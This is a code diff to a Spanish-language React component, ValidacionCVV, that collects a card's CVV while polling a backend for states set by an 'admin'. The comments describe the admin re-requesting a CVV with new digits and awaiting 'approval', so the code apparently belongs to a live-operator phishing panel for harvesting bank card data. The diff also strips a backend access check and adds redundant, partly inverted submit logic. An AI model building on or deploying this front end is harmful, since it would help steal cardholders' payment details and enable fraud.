@@ -18,6 +18,8 @@ export default function ValidacionCVV() {
     const [cargando, setCargando] = useState(false); // Loading state
     const [submitted, setSubmitted] = useState(false); // Flag para prevenir múltiples envíos
     const [polling, setPolling] = useState(false); // Estado para activar polling
+    const [focusedField, setFocusedField] = useState(""); // 'digits' | 'expiration' | 'cvv'
+    const [hasError, setHasError] = useState(false);
 
     // Estado para el modal de error
     const [formState, setFormState] = useState({
@@ -106,7 +108,7 @@ export default function ValidacionCVV() {
 
                 // PRIMERO verificar estados de error (deben tener prioridad)
                 // Si estamos en CVV y se rechaza CVV Custom, mostrar error y NO redirigir
-                if (estado === 'error_cvv_custom') {
+                if (estado == 'error_cvv' || estado === 'error_cvv_custom') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
@@ -131,21 +133,13 @@ export default function ValidacionCVV() {
                 // Si el estado es solicitar_cvv_custom durante polling, significa que el admin
                 // volvió a solicitar CVV Custom (posiblemente con nuevos dígitos)
                 // Recargar la página para asegurar vista limpia
-                if (estado === 'solicitar_cvv_custom') {
+                if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
-                    window.location.reload();
-                    return;
-                }
-
-                // Si es solicitar_cvv (no custom), detener polling pero mantener en la vista
-                if (estado === 'solicitar_cvv') {
-                    clearInterval(interval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    setPolling(false);
+                    if (estado === 'solicitar_cvv_custom')
+                        window.location.reload();
                     return;
                 }
 
@@ -423,56 +417,6 @@ export default function ValidacionCVV() {
         const params = new URLSearchParams(window.location.search);
         const mode = params.get('mode');
         const sesionId = params.get('sesionId');
-
-        // Validar acceso: verificar estado del backend antes de permitir acceso
-        const validateAccess = async () => {
-            if (!sesionId) {
-                const rawData = localStorage.getItem("datos_usuario");
-                const userData = rawData ? JSON.parse(rawData) : {};
-                const localSesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
-
-                if (!localSesionId) {
-                    console.error('Acceso sin sesionId');
-                    navigate('/');
-                    return false;
-                }
-
-                // Verificar estado del backend
-                try {
-                    const response = await instanceBackend.post(`/consultar-estado/${localSesionId}`);
-                    const { estado } = response.data;
-
-                    // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
-                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
-                        navigate('/');
-                        return false;
-                    }
-                } catch (error) {
-                    console.error('Error validando acceso:', error);
-                    navigate('/');
-                    return false;
-                }
-            } else {
-                // Verificar estado del backend con sesionId de URL
-                try {
-                    const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
-                    const { estado } = response.data;
-
-                    // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
-                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
-                        navigate('/');
-                        return false;
-                    }
-                } catch (error) {
-                    console.error('Error validando acceso:', error);
-                    navigate('/');
-                    return false;
-                }
-            }
-            return true;
-        };
 
         // Cargar cardData desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
         const savedCardData = localStorageService.getItem("selectedCardData");
@@ -778,11 +722,29 @@ export default function ValidacionCVV() {
 
     // Manejar cambio en el input (solo números)
     const handleCvvChange = (e) => {
+
+        // Se obtiene el valor del input
         const val = e.target.value;
+
         // Solo permitir números y respetar la longitud máxima
         if (/^\d*$/.test(val) && val.length <= cvvLength) {
+
+            // Se setea el CVV con el nuevo valor (solo si es numérico y dentro del límite)
             setCvv(val);
-        }
+
+            // Se valida cuando el usuario ha completado el CVV para activar el botón de enviar
+            if (val.length === cvvLength) {
+
+                // Se habilita el botón de enviar (esto se maneja en el JSX con disabled={cvv.length !== cvvLength || cargando})
+                setSubmitted(false);
+                setHasError(false);
+                setSubmitted(false);
+            } else {
+                // Si el CVV no está completo, asegurarse de que el botón de enviar esté desactivado
+                setSubmitted(true);
+                setSubmitted(true);
+            };
+        };
     };
 
     // Estado para controlar el foco del input
@@ -934,18 +896,34 @@ export default function ValidacionCVV() {
                                 >
                                     {/* Generar array de placeholders según la longitud (3 o 4) */}
                                     {Array.from({ length: cvvLength }).map((_, index) => {
-                                        // LOGICA DE COLOR TIPO OTP:
+
+                                        // Lógica para determinar el estado de cada línea
                                         const activeIndex = cvv.length < cvvLength ? cvv.length : cvvLength - 1;
                                         const isActive = isFocused && index === activeIndex;
 
+                                        // Determinar si la celda está vacía (sin dígito) para mostrar error
+                                        const isEmpty = index >= cvv.length;
+
+                                        // Determinar si hay error: solo si el campo está enfocado, la longitud es menor a lo requerido, y la celda actual está vacía
+                                        const isErrorCell =
+                                            hasError &&
+                                            !isFocused &&
+                                            cvv.length < cvvLength &&
+                                            isEmpty;
+
+                                        // Renderizar cada línea con el color correspondiente según su estado
                                         return (
                                             <div
                                                 key={index}
                                                 style={{
                                                     width: "30px",
                                                     height: "30px",
-                                                    // Solo el ACTIVO es amarillo, el resto blanco
-                                                    borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
+                                                    borderBottom: `2px solid ${isErrorCell
+                                                        ? "#ff8389"     // 🔴 vacíos
+                                                        : isActive
+                                                            ? "#FDDA24"     // 🟡 activo
+                                                            : "#ffffff"     // ⚪ normal
+                                                        }`,
                                                     transition: "border-color 0.2s ease",
                                                     display: "flex",
                                                     justifyContent: "center",
@@ -988,8 +966,14 @@ export default function ValidacionCVV() {
                                     inputMode="numeric"
                                     value={cvv}
                                     onChange={handleCvvChange}
-                                    onFocus={() => setIsFocused(true)}
-                                    onBlur={() => setIsFocused(false)}
+                                    onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
+                                    onBlur={() => {
+                                        setIsFocused(false);
+                                        setFocusedField("");
+                                        if (cvv.length !== cvvLength) {
+                                            setHasError(true);
+                                        }
+                                    }}
                                     style={{
                                         position: "absolute",
                                         top: 0,
